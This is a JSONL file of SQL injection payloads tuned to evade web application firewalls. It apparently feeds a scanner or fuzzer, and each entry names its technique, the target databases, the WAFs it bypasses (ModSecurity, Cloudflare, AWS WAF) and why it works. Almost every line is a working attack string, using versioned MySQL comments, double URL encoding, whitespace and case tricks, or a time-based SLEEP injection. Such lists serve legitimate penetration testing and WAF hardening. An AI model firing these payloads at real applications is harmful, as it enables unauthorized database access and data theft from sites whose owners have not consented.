# SQLi WAF Bypass Payloads — inline comments, encoding tricks, case manipulation, whitespace alternatives, concatenation, HPP
{"text": "' /*!50000OR*/ 1=1 --", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.88, "explanation": "MySQL versioned comment bypass. /*!50000...*/ executes the enclosed SQL only on MySQL >=5.00.00. WAFs often fail to parse MySQL-specific comment syntax."}
{"text": "' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL --", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.87, "explanation": "Versioned comments around UNION SELECT keywords. Each keyword is individually wrapped, breaking WAF pattern matching on the combined UNION SELECT token."}
{"text": "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ NULL,version() --", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "cloudflare"], "severity_boost": 0.85, "explanation": "Triple versioned comment wrapping with UNION ALL SELECT. The ALL keyword between UNION and SELECT further disrupts pattern matching."}
{"text": "' UN/**/ION SEL/**/ECT NULL,NULL --", "technique": "waf_bypass", "databases": ["mysql", "postgresql", "mssql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.82, "explanation": "Inline comment keyword splitting. Inserting /**/ inside SQL keywords breaks WAF regex patterns while the SQL parser correctly ignores the comments."}
{"text": "' UNI%6fN SEL%65CT NULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.75, "explanation": "URL-encoded character substitution within keywords. %6f=o, %65=e. If the WAF inspects before URL decoding but the app decodes first, the keywords are reconstructed."}
{"text": "%27%20OR%201%3D1%20--", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.80, "explanation": "Fully URL-encoded payload: ' OR 1=1 --. Some WAFs fail to decode URL encoding before analysis, missing the SQL injection entirely."}
{"text": "%2527%20OR%201%3D1%20--", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["cloudflare", "aws_waf", "generic"], "severity_boost": 0.83, "explanation": "Double URL encoding. %25 decodes to %, so %2527 first becomes %27, then the app decodes again to single quote. Bypasses single-pass decoding WAFs."}
{"text": "' UNION%0aSELECT%0aNULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.83, "explanation": "Newline-separated keywords using %0a (LF). SQL treats newlines as whitespace, but WAF regex patterns for UNION SELECT may require a space between them."}
{"text": "' UNION%09SELECT%09NULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.82, "explanation": "Tab character (%09) as whitespace alternative. SQL accepts tabs between keywords but WAF patterns may only match spaces."}
{"text": "' UNION%0dSELECT%0dNULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.80, "explanation": "Carriage return (%0d) as whitespace. SQL parsers accept CR as whitespace, but WAFs may not normalize it before pattern matching."}
{"text": "' UNION%0d%0aSELECT%0d%0aNULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.80, "explanation": "CRLF sequence as whitespace. Combines carriage return and line feed, which is standard line ending on Windows. SQL parsers handle it as whitespace."}
{"text": "' uNiOn SeLeCt NULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["generic"], "severity_boost": 0.78, "explanation": "Mixed case keyword evasion. SQL keywords are case-insensitive, but naive WAF regex patterns may only match specific casings like UNION or union."}
{"text": "' UnIoN/**/sElEcT/**/NULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.82, "explanation": "Combined case mixing with inline comments. Double evasion technique that circumvents both case-sensitive and whitespace-dependent WAF rules."}
{"text": "' OR CHAR(49)=CHAR(49) --", "technique": "waf_bypass", "databases": ["mysql", "mssql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.80, "explanation": "CHAR function to avoid literal characters. CHAR(49) is '1', so this is equivalent to '1'='1' but without the numeric literals WAFs detect."}
{"text": "' OR 0x31=0x31 --", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.79, "explanation": "Hex-encoded comparison. 0x31 is '1' in hex. MySQL interprets hex literals natively, but WAFs may not decode hex before analysis."}
{"text": "' UNION SELECT CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114)),NULL --", "technique": "waf_bypass", "databases": ["mysql", "mssql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "cloudflare", "generic"], "severity_boost": 0.80, "explanation": "CHAR-based string construction. Builds the string 'user' from individual character codes, avoiding any recognizable string literals in the query."}
{"text": "' OR 1=(SELECT 1 FROM dual WHERE 1=1) --", "technique": "waf_bypass", "databases": ["oracle"], "contexts": ["string"], "waf_bypasses": ["generic"], "severity_boost": 0.78, "explanation": "Subquery-based tautology. The additional nesting through a subquery may evade WAF rules that only check for direct OR 1=1 patterns."}
{"text": "' /*!UNION*/ /*!SELECT*/ 1,2,3 --", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.85, "explanation": "Non-versioned MySQL inline comments. /*!...*/ without a version number executes on all MySQL versions. Less commonly blocked than versioned variants."}
{"text": "' UNION(SELECT(1),(2),(3)) --", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.80, "explanation": "Parentheses instead of spaces. UNION(SELECT... and wrapping each column in parentheses eliminates whitespace between keywords, bypassing space-dependent rules."}
{"text": "' UNION+SELECT+NULL,NULL --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.77, "explanation": "Plus sign as space in URL context. The + character is decoded to space in application/x-www-form-urlencoded but WAFs may not perform this decoding."}
{"text": "' AND 1=1-- -", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity"], "severity_boost": 0.82, "explanation": "No space before comment. The -- followed by a dash at the end is a MySQL-compatible comment that avoids the standard -- (space) pattern WAFs look for."}
{"text": "'-IF(1=1,SLEEP(5),0)-- '", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.83, "explanation": "Hyphen as subtraction operator combined with IF/SLEEP. The subtraction operator allows executing a function without using AND/OR keywords."}
{"text": "' AND/**/ 1=1 --", "technique": "waf_bypass", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["generic"], "severity_boost": 0.78, "explanation": "Comment as whitespace between AND and condition. Replaces the expected space with a block comment, breaking WAF patterns that expect AND<space>condition."}
{"text": "admin'-- ", "technique": "waf_bypass", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.90, "explanation": "Minimal payload with no SQL keywords. Only a quote and comment — nearly impossible to block with keyword-based WAF rules without excessive false positives."}
{"text": "' OR 1-- -", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["modsecurity", "generic"], "severity_boost": 0.85, "explanation": "Minimal tautology. MySQL treats non-zero as truthy so OR 1 is equivalent to OR TRUE. The minimal payload reduces WAF signature surface."}
{"text": "' /*!12345UNION*/ /*!12345SELECT*/ NULL,@@version --", "technique": "waf_bypass", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["cloudflare", "aws_waf", "modsecurity"], "severity_boost": 0.86, "explanation": "Low version number in MySQL comments. /*!12345...*/ executes on MySQL >= 1.23.45 (effectively all versions). The unusual version number evades known comment patterns."}
